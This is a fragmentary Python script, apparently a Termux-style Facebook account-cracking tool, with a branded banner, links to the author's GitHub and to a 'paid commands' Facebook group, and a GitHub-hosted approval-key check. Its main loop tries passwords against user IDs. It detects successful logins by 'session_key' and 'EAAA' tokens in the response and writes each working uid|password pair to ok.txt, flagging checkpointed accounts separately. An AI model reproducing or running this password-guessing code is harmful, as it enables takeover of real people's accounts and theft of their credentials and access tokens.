...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m JOKAR ABIR\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : JOKAR ABIR \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Jokar-Abir37 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/Jokar.Abir123 \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Jokar-Abir37/king-Abir-approval.txt/blob/main/approval.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://www.facebook.com/Jokar.Abir123")
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/groups/ABIR.king.paid.commands/?ref=share_group_link")
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/groups/ABIR.king.paid.commands/?ref=share_group_link"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Jokar-Abir37/Abir-king-aproval.txt').text
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/groups/ABIR.king.paid.commands/?ref=share_group_link/UCOo-omO_OVoU0B1109O0Z8g"])
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=king-Abir=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=king-Abir=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=ABIR=CP=>] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Facebook  : https://www.facebook.com/Jokar.Abir123/ ")

		print(" [*] Instagram : JOKAR ABIR/ ")

		print(" [*] YouTube   : NAY / ")

		exit(" [*] GitHub    : https://github.com/Jokar-Abir37/ ")
